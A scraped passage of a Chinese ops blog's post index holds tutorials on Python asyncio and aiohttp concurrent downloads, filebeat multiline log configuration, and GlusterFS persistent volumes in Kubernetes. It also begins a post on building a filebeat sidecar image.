print(resp.status) print(await resp.text()) return session session = asyncio.run(login()) print(f\u0026#34;{session}\u0026#34;) 再给一个完全版的主函数是进程，下载是协程的例子，注意里面的 aiohttp.TCPConnector(limit=10)，限制一下并发是10个，否则会被服务器 Ban 掉：\nimport asyncio import time import aiohttp from aiohttp.client import ClientSession async def download_link(url:str,session:ClientSession): async with session.get(url) as response: result = await response.text() print(f\u0026#39;Read {len(result)} from {url}\u0026#39;) async def download_all(urls:list): my_conn = aiohttp.TCPConnector(limit=10) async with aiohttp.ClientSession(connector=my_conn) as session: tasks = [] for url in urls: task = asyncio.ensure_future(download_link(url=url,session=session)) tasks.append(task) await asyncio.gather(*tasks,return_exceptions=True) # the await must be nest inside of the session url_list = [\u0026#34;https://www.google.com\u0026#34;,\u0026#34;https://www.bing.com\u0026#34;]*50 print(url_list) start = time.time() asyncio.run(download_all(url_list)) end = time.time() print(f\u0026#39;download {len(url_list)} links in {end - start} seconds\u0026#39;) 协程里的 session 也有很多种用法，参考下面的链接就好：\nhttps://blog.csdn.net/weixin_39643613/article/details/109171090\n我们也给出简单易用的线程池版，说不定以后会用上：\nimport requests from requests.sessions import Session import time from concurrent.futures import ThreadPoolExecutor from threading import Thread,local url_list = [\u0026#34;https://www.google.com/\u0026#34;,\u0026#34;https://www.bing.com\u0026#34;]*50 thread_local = local() def get_session() -\u0026gt; Session: if not hasattr(thread_local,\u0026#39;session\u0026#39;): thread_local.session = requests.Session() return thread_local.session def download_link(url:str): session = get_session() with session.get(url) as response: print(f\u0026#39;Read {len(response.content)} from {url}\u0026#39;) def download_all(urls:list) -\u0026gt; None: with ThreadPoolExecutor(max_workers=10) as executor: executor.map(download_link,url_list) start = time.time() download_all(url_list) end = time.time() print(f\u0026#39;download {len(url_list)} links in {end - start} seconds\u0026#39;) ","permalink":"https://rendoumi.com/posts/20211112-python_aiohttp/","summary":"\u003cp\u003e在实际中遇到这样一个问题，公司软件发布上线自动化。\u003c/p\u003e\n\u003cp\u003e说简单点，就是需要去登录一个上线的内部网站，然后爬下所有的上线数据。\u003c/p\u003e\n\u003cp\u003e然后根据爬下来的数据整理好，可以一起上线的，就并发多线程，其实就是去传参数点击一个链接等返回。\u003c/p\u003e\n\u003cp\u003e不能并发的就单线程点链接。\u003c/p\u003e\n\u003cp\u003e那这个事情必须更有效率，单线程的没问题，用 python 的 request 就可以实现了。\u003c/p\u003e\n\u003cp\u003e我们仔细研究一下协程，先讲一下历史：\u003c/p\u003e\n\u003cp\u003e使用Python的人往往纠结在多线程、多进程，哪个效率更高？到底用哪个好呢？\u003c/p\u003e\n\u003cp\u003e其实 Python 的多进程和多线程，相对于别家的协程和异步处理机制，都不行，线程之间切换耗费 CPU 和寄存器，OS 的调度不可控，多进程之间通讯也不便。性能根本不行。\u003c/p\u003e\n\u003cp\u003e后来呢 Python 改进了语法，出现了 yiled from 充当协程调度，有人就根据这个特性开发了第三方的协程框架，Tornado，Gevent等。\u003c/p\u003e\n\u003cp\u003e官方也不能坐视不理啊，任凭别人出风头，于是 Python 之父深入简出3年，苦心钻研自家的协程，async/await 和 asyncio 库，并放到 Python3.5 后成为官方原生的协程。\u003c/p\u003e\n\u003cp\u003e对于 http请求、读写文件、读写数据库这种高延时的 IO 操作，协程是个大杀器，优点非常多；它可以在预料到一个阻塞将发生时，挂起当前协程，跑去执行其它协程，同时把事件注册到循环中，实现了多协程并发，其实这玩意是跟 Nodejs 的回调学的。\u003c/p\u003e\n\u003cp\u003e看下图，详细解释下，左边我们有100个网页请求，并发100个协程请求（其实也是1个1个发），当需要等待长时间回应回应时，挂起当前协程，并注册一个回调函数到事件循环（Event Loop）中，执行下一个协程，当有协程事件完成再通过回调函数唤醒挂起的协程，然后返回结果。\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20211112-python_aiohttp/image-20211112085624811.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这个跟 nodejs 的回调函数基本一样，我们必须注意主进程和协程的关系，如果我在一个主进程中，触发协程函数，有100个协程，那么必须等待100个协程都结束后，才能回到正常的那个主进程中。当然，主进程也可能也是一个协程。\u003c/p\u003e\n\u003cp\u003e那么协程的基本用法\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003easync f(n) 声明一个函数是协程的\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eawait f(n) 挂起当前协程，把控制权交回 event loop，并且执行f(n)和注册之后的f(n)回调。\u003c/p\u003e\n\u003cp\u003e举个例子：如果在 g() 这个函数中执行了 await f()，那么g()函数会被挂起，并等待 f() 函数有结果结束，然后返回 g() 继续执行。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003easync\u003c/span\u003e \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003easync\u003c/span\u003e \u003cspan class=\"k\"\u003ewith\u003c/span\u003e \u003cspan class=\"n\"\u003eaiohttp\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eClientSession\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"n\"\u003esession\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003easync\u003c/span\u003e \u003cspan class=\"k\"\u003ewith\u003c/span\u003e \u003cspan class=\"n\"\u003esession\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"n\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"k\"\u003eawait\u003c/span\u003e \u003cspan class=\"n\"\u003eresponse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e最后一行 await 是挂起命令，挂起当前函数 get() ，并执行 response.text() 和注册回调，等待 response.text() 执行完成后重新激活当前函數get()继续执行，返回。\u003c/p\u003e","title":"Python的协程详细解释"},{"content":"我们介绍了如何在 kubernetes 环境中使用 filebeat sidecar 方式收集日志\n使用的是 filebeat 的 moudle 模块，但凡是常用的软件，基本都有对应的模块可用，所以我们首先应该使用模块来收集日志。\n那对于一些我们自己写的 Go 软件呢，或者根本不是标准的，那该怎么办呢？\n那就自定义 filebeat.inputs，网上的 filebeat 例子，其实大多都是这样的\n很简单，给个例子\n[beat-logstash-some-name-832-2015.11.28] IndexNotFoundException[no such index] at org.elasticsearch.cluster.metadata.(IndexNameExpressionResolver.java:566) at org.elasticsearch.cluster.metadata.(IndexNameExpressionResolver.java:133) at org.elasticsearch.cluster.metadata.(IndexNameExpressionResolver.java:77) at org.elasticsearch.action.admin..checkBlock(TransportDeleteIndexAction.java:75) 看如上日志，如果不用模式匹配的话，那么会送5条记录到 ES， Kibana 看起来就十分割裂了。\n所以要用正则把底下的4行和上面的第1行合在一起，合并成一条就记录推送到 ES 去\n仔细观察，开头一行是以 [ 开始的，所以正则就是 \u0026lsquo;^\\[\u0026rsquo;，我们要匹配的是底下的4行，必须反转一下模式。\nmultiline 的 negate 属性，这个是指定是否反转匹配到的内容，这里如果是 true 的话，反转，那就是选择不以 [ 开头的行。 netgate 属性的缺省值是 false\nmultiline 的 match 属性，after 指追加到上一条事件（向上合并），before 指合并到下一条（向下合并）\n于是，我们就可以写出以下的匹配模式，这样就把匹配到条目追加到上一条，合并在一起了：\nfilebeat.inputs: - type: log enabled: true paths: - /Users/liuxg/data/multiline/multiline.log multiline.type: pattern multiline.pattern: \u0026#39;^\\[\u0026#39; multiline.negate: true multiline.match: after output.elasticsearch: hosts: [\u0026#34;localhost:9200\u0026#34;] index: \u0026#34;multiline\u0026#34; 再给个例子，java 的 stack 调用，日志格式如下：\nException in thread \u0026#34;main\u0026#34; java.lang.NullPointerException at com.example.myproject.Book.getTitle(Book.java:16) at com.example.myproject.Author.getBookTitles(Author.java:25) at com.example.myproject.Bootstrap.main(Bootstrap.java:14) 分析一下：\n匹配到开头是空格的那些行，正则 \u0026lsquo;^[[:space]]\u0026rsquo; 匹配的行不反转，就是要那些空格开头的行，所以 negate 是缺省的 false 匹配的空格行追加到上一个事件，向上合并，所以 match 是 after filebeat.inputs: - type: log enabled: true paths: - /Users/liuxg/data/multiline/multiline.log multiline.type: pattern multiline.pattern: \u0026#39;^[[:space:]]\u0026#39; multiline.negate: false multiline.match: after 再给个例子，假如你在 Go 程序里定义了输出日志的格式，以 Start new event 开头，以 End event 结尾\n[2015-08-24 11:49:14,389] Start new event [2015-08-24 11:49:14,395] Content of processing something [2015-08-24 11:49:14,399] End event [2015-08-24 11:50:14,389] Some other log [2015-08-24 11:50:14,395] Some other log [2015-08-24 11:50:14,399] Some other log [2015-08-24 11:51:14,389] Start new event [2015-08-24 11:51:14,395] Content of processing something [2015-08-24 11:51:14,399] End event 我们就用到 filebeat multiline 的另一个开关，flush_pattern，来控制如何结束，注意 negate 是 true ，匹配到的是 Start 和 End 中间的部分：\nmultiline.type: pattern multiline.pattern: \u0026#39;Start new event\u0026#39; multiline.negate: true multiline.match: after multiline.flush_pattern: \u0026#39;End event\u0026#39; filebeat.inputs: - type: log enabled: true paths: - /Users/liuxg/data/multiline/multiline.log multiline.type: pattern multiline.pattern: \u0026#39;Start new event\u0026#39; multiline.negate: true multiline.match: after multiline.flush_pattern: \u0026#39;End event\u0026#39; 给两篇参考，大家一定要先看那篇原版英文的，中文的那篇翻得不太好；最好两篇对照着看。\n参考：\nhttps://www.elastic.co/guide/en/beats/filebeat/current/multiline-examples.html https://developer.aliyun.com/article/764544 ","permalink":"https://rendoumi.com/posts/20211111-k8s_filebeat/","summary":"\u003cp\u003e我们介绍了如何在 kubernetes 环境中使用 filebeat sidecar 方式收集日志\u003c/p\u003e\n\u003cp\u003e使用的是 filebeat 的 moudle 模块，但凡是常用的软件，基本都有对应的模块可用，所以我们首先应该使用模块来收集日志。\u003c/p\u003e\n\u003cp\u003e那对于一些我们自己写的 Go 软件呢，或者根本不是标准的，那该怎么办呢？\u003c/p\u003e\n\u003cp\u003e那就自定义 filebeat.inputs，网上的 filebeat 例子，其实大多都是这样的\u003c/p\u003e\n\u003cp\u003e很简单，给个例子\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e[beat-logstash-some-name-832-2015.11.28] IndexNotFoundException[no such index]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eat org.elasticsearch.cluster.metadata.(IndexNameExpressionResolver.java:566)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eat org.elasticsearch.cluster.metadata.(IndexNameExpressionResolver.java:133)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eat org.elasticsearch.cluster.metadata.(IndexNameExpressionResolver.java:77)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eat org.elasticsearch.action.admin..checkBlock(TransportDeleteIndexAction.java:75)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e看如上日志，如果不用模式匹配的话，那么会送5条记录到 ES， Kibana 看起来就十分割裂了。\u003c/p\u003e\n\u003cp\u003e所以要用正则把底下的4行和上面的第1行合在一起，合并成一条就记录推送到 ES 去\u003c/p\u003e\n\u003cp\u003e仔细观察，开头一行是以 [ 开始的，所以正则就是 \u0026lsquo;^\\[\u0026rsquo;，我们要匹配的是底下的4行，必须反转一下模式。\u003c/p\u003e\n\u003cp\u003emultiline 的 negate 属性，这个是指定是否反转匹配到的内容，这里如果是 true 的话，反转，那就是选择不以 [ 开头的行。 netgate 属性的缺省值是 false\u003c/p\u003e\n\u003cp\u003emultiline 的 match 属性，after 指追加到上一条事件（向上合并），before 指合并到下一条（向下合并）\u003c/p\u003e\n\u003cp\u003e于是，我们就可以写出以下的匹配模式，这样就把匹配到条目追加到上一条，合并在一起了：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efilebeat.inputs:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003e- type: log\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eenabled: true\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003epaths:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"na\"\u003e- /Users/liuxg/data/multiline/multiline.log\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003emultiline.type: pattern\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003emultiline.pattern: \u0026#39;^\\[\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003emultiline.negate: true\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003emultiline.match: after\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eoutput.elasticsearch:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"na\"\u003ehosts: [\u0026#34;localhost:9200\u0026#34;]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"na\"\u003eindex: \u0026#34;multiline\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e再给个例子，java 的 stack 调用，日志格式如下：\u003c/p\u003e","title":"kubernetes使用filebeat multiline自定义收集日志"},{"content":"在生产环境使用 Kubernetes ，绕不过去的一个问题就是持久化卷。\n如果是使用阿里 ACK 托管平台的话，可以用 OSS 来持久化卷，如果是自搭的 kubernetes，那么存储就需要仔细考虑了。\nceph比较复杂，容易出故障。nfs 也不可用，毛病多多。minio倒是可以。\n这种情况下使用双副本的 GlusterFS 就是不错的选择。\n生产环境就不能随意了，最好不要使用 Heketi，因为凡是要持久化的东西，都是比较重要的东西，最好都有 yaml 记录。\nGlusterFS 的搭建就不说了。说说实际使用过程：\n一、装GFS，生产新卷 安装就不说了，我们的GFS有两个节点，172.19.20.18 和 172.19.20.36，我们强制建立一个两副本的卷： kuaijian-vol\ngluster volume create kuaijian-vol replica 2 transport tcp 172.19.20.18:/glusterfs/kuaijian-vol 172.19.20.36:/glusterfs/kuaijian-vol force 二、为k8s产生GFS的endingpoint和service cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; ep-svc.yaml --- apiVersion: v1 kind: Service metadata: name: gfs-cluster_svc spec: ports: - port: 1 --- apiVersion: v1 kind: Endpoints metadata: name: gfs-cluster_svc subsets: - addresses: - ip: 172.19.20.18 ports: - port: 1 - addresses: - ip: 172.19.20.36 ports: - port: 1 EOF kubectl apply -f ep-svc.yaml 这里要提一个概念，通常情况下 service 是通过 selector 标签来选择对应的 pod 来增加 endingpoint 的。如下：\napiVersion: v1 kind: Service metadata: name: go-api_svc spec: ports: - port: 8080 protocol: TCP targetPort: 8080 selector: app: go-api type: ClusterIP 而上面，我们没有通过标签，而是让 endingpoint 和 svc 同名而手动增加 endingpoint 到 svc 的。\n三、为k8s生产创建 PV和PVC 静态环境不使用 Storageclass 持久化卷的图解如下，pod做pvc声明，pvc连接到pv，pv从GFS中拿到卷。\n首先声明一个 pv：\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; kuaijian-pv.yaml apiVersion: v1 kind: PersistentVolume metadata: name: gfs-kuaijian-50G_pv labels: name: gfs-kuaijian-50G_pv spec: capacity: storage: 50Gi accessModes: - ReadWriteMany glusterfs: endpoints: gfs-cluster_svc path: kuaijian-vol readOnly: false persistentVolumeReclaimPolicy: Retain EOF kubectl apply -f kuaijian-pv.yaml 然后声明一个 pvc 通过 matchLabels 来跟之前的 pv 绑定。\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; kuaijian-pvc.yaml kind: PersistentVolumeClaim apiVersion: v1 metadata: name: gfs-kuaijian-50G_pvc spec: accessModes: - ReadWriteMany resources: requests: storage: 50Gi selector: matchLabels: name: gfs-kuaijian-50G_pv EOF kubectl apply -f kuaijian-pvc.yaml 注意上面的 pvc，我们一下子申请了50G，把整个 pv 空间全用光了；当然我们也可以只申请个 10Gi，下个 pvc 再 10Gi，这样也是行的通的。\n四、POD使用PVC 声明一个 Nginx 的 Deployment 来使用这个 pvc\napiVersion: apps/v1 kind: Deployment metadata: name: nginx-deployment labels: app: nginx spec: replicas: 2 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx ports: - containerPort: 80 volumeMounts: - name: data-www mountPath: /data/www volumes: - name: data-www persistentVolumeClaim: claimName: gfs-kuaijian-50G_pvc 这样 kubernetes 的存储部分就搞定了。GFS 用于生产非常稳定，基本跑了 7 年了没有大毛病。\n","permalink":"https://rendoumi.com/posts/20211110-k8s_gfs/","summary":"\u003cp\u003e在生产环境使用 Kubernetes ，绕不过去的一个问题就是持久化卷。\u003c/p\u003e\n\u003cp\u003e如果是使用阿里 ACK 托管平台的话，可以用 OSS 来持久化卷，如果是自搭的 kubernetes，那么存储就需要仔细考虑了。\u003c/p\u003e\n\u003cp\u003eceph比较复杂，容易出故障。nfs 也不可用，毛病多多。minio倒是可以。\u003c/p\u003e\n\u003cp\u003e这种情况下使用双副本的 GlusterFS 就是不错的选择。\u003c/p\u003e\n\u003cp\u003e生产环境就不能随意了，最好不要使用 Heketi，因为凡是要持久化的东西，都是比较重要的东西，最好都有 yaml 记录。\u003c/p\u003e\n\u003cp\u003eGlusterFS 的搭建就不说了。说说实际使用过程：\u003c/p\u003e\n\u003ch2 id=\"一装gfs生产新卷\"\u003e一、装GFS，生产新卷\u003c/h2\u003e\n\u003cp\u003e安装就不说了，我们的GFS有两个节点，172.19.20.18 和 172.19.20.36，我们强制建立一个两副本的卷： kuaijian-vol\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume create kuaijian-vol replica \u003cspan class=\"m\"\u003e2\u003c/span\u003e transport tcp 172.19.20.18:/glusterfs/kuaijian-vol 172.19.20.36:/glusterfs/kuaijian-vol force\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"二为k8s产生gfs的endingpoint和service\"\u003e二、为k8s产生GFS的endingpoint和service\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; ep-svc.yaml\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eapiVersion: v1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ekind: Service\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  name: gfs-cluster_svc \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003espec:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  ports:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  - port: 1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eapiVersion: v1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ekind: Endpoints\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  name: gfs-cluster_svc \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esubsets:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  - addresses:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      - ip: 172.19.20.18 \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      - port: 1 \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  - addresses:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      - ip: 172.19.20.36 \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      - port: 1 \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl apply -f ep-svc.yaml\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这里要提一个概念，通常情况下 service 是通过 selector 标签来选择对应的 pod 来增加 endingpoint 的。如下：\u003c/p\u003e","title":"生产环境kubernetes使用持久化卷GlusterFS"},{"content":"在生产环境中，ES 通常是不会在 k8s 集群中存在的，一般 MySQL 和 Elasticsearch 都是独立在 k8s 之外。\n那么无论哪种 pod，要甩日志到 ES，最轻量的方案肯定是用 filebeat 甩过去了。\n当然，如果是阿里的 ACK，logtail 和 logstore 配搭已经非常不错了，根本用不到 filebeat 和 ES。\n可但是，我们不想为阿里 sls、logstore 出钱买单，就只能用 filebeat + ES 了\n说一下 filebeat 的 sidecar 边车（僚机）用法：\n如上图所示，简单说就是起一个 filebeat 的 logging-agent 边车（僚机），边车和主应用之间共享某个文件夹（mountPath），达到收集主应用日志并发送到 ES，而不用动 app-container 分毫。\n我们以部署一个 Tomcat 应用为例来说明：\n一、打造 filebeat 边车镜像 首先准备 Dockerfile\nFROM alpine:3.12 ARG VERSION=7.15.1 COPY docker-entrypoint.sh / RUN set -x \\ \u0026amp;\u0026amp; cd /tmp \\ \u0026amp;\u0026amp; wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-${VERSION}-linux-x86_64.tar.gz \\ \u0026amp;\u0026amp; tar xzvf filebeat-${VERSION}-linux-x86_64.tar.gz \\ \u0026amp;\u0026amp; mv filebeat-${VERSION}-linux-x86_64 /opt \\ \u0026amp;\u0026amp; rm /tmp/* \\ \u0026amp;\u0026amp; chmod +x /docker-entrypoint.sh ENV PATH $PATH:/opt/filebeat-${VERSION}-linux-x86_64 WORKDIR /opt/filebeat-${VERSION}-linux-x86_64 ENTRYPOINT [\u0026#34;/docker-entrypoint.sh\u0026#34;] 我们以 alphine:3.12 为底版，然后下载 filebeat 7.15.1的二进制包并释放到 /opt 下，最后指定入口文件 /docker-entrypoint.sh\n奥妙全在这个 docker-entrypoint.sh 中了\n#!/bin/bash cat \u0026gt; /etc/filebeat.yaml \u0026lt;\u0026lt; EOF filebeat.config.modules: path: /opt/filebeat-7.15.1-linux-x86_64/modules.d/*.yml reload.enabled: true # 加入自定义的字段 fields_under_root: true fields: project: kuaijian-tomcat pod_ip: ${POD_IP} pod_name: ${POD_NAME} node_name: ${NODE_NAME} pod_namespace: ${POD_NAMESPACE} # 收集云厂商的数据和docker的变量 processors: - add_cloud_metadata: ~ - add_docker_metadata: ~ filebeat.modules: - module: apache access: enabled: true var.paths: - \u0026#34;/usr/local/tomcat/logs/localhost_access_log.*.txt\u0026#34; error: enabled: true var.paths: - \u0026#34;/usr/local/tomcat/logs/application.log*\u0026#34; - \u0026#34;/usr/local/tomcat/logs/catalina.*.log\u0026#34; - \u0026#34;/usr/local/tomcat/logs/host-manager.*.log\u0026#34; - \u0026#34;/usr/local/tomcat/logs/localhost.*.log\u0026#34; - \u0026#34;/usr/local/tomcat/logs/manager.*.log\u0026#34; setup.template.name: \u0026#34;tomcat-logs\u0026#34; setup.template.pattern: \u0026#34;tomcat-logs-*\u0026#34; output.elasticsearch: hosts: [\u0026#34;172.19.20.xxx:9200\u0026#34;,\u0026#34;172.19.20.xxx:9200\u0026#34;] index: 